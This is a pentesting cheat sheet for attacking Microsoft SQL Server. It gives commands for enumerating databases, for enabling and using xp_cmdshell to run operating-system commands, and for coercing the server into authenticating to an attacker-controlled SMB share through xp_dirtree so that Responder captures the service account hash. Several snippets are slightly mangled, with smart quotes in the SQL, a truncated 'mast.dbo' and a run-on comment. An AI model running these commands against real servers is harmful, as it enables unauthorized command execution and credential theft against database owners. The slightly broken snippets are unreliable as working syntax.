
## Good places
[hacktricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server)
[pentestmonkey](https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet)

## Warning
Be careful, you can **block accounts** if you fail login several times using an existing username.

## Impacket smb related scripts
[[Impacket-Cheatsheet]]; if you have credentials:
```bash
# connect to a Microsoft SQL server
impacket-mssqlclient -port $PORT $domain/$sql_svc 
```

```sql
SELECT @@version					 	-- version check
SELECT DB_NAME()						-- current database
SELECT name FROM master..sysdatabases;	-- list databases

SELECT name, database_id, create_date FROM sys.databases;

USE <databasenamegoeshere>
SELECT * FROM information_schema.tables;
SELECT * FROM users;

-- Has two comment types
SELECT 1 — comment  
SELECT /*comment*/ 

SELECT is_srvrolemember('sysadmin'); 	-- role check

```

Show all the tables in a database
```sql
SELECT table_name, table_schema, table_type
    FROM information_schema.tables
    WHERE table_catalog = 'TestDB'
    ORDER BY table_name ASC;
```

Show all tables across all databases
```sql
SELECT *
    FROM information_schema.tables
    ORDER BY table_name ASC;
```


## Command Execution
Check if cmdshell is already active
```sql   
EXEC xp_cmdshell ‘net user’; -- privOn MSSQL 2005 you may need to reactivate xp_cmdshell first as it’s disabled by default:
EXEC sp_configure ‘show advanced options’, 1; -- priv  
RECONFIGURE; -- priv  
EXEC sp_configure ‘xp_cmdshell’, 1; -- priv  
RECONFIGURE; -- priv
-- OR
EXEC mast.dbo.xp_cmdshell 'cmd';
```

Arbituary File Reading with xp_dirtree
```sql
declare @q varchar(200); set @q ='\$ip\IppsecIsAwesome\test'; EXEC xp_dirtree @q;--+ 
```
Or
```sql
declare @q varchar(200); set @q ='\$ip\IppsecIsAwesome\test';exec master.dbo.xp_dirtree @q;--+
```

## Hash Passback
Use [[Responder-Cheatsheet]] to catch the service hash of user 
```bash
sudo responder -I $interface
xp_dirtree "\\attacker_ip\Share"
```

## References
[pentestmonkey](https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet)
[therootcompany](https://therootcompany.com/blog/mssql-cheat-sheet/)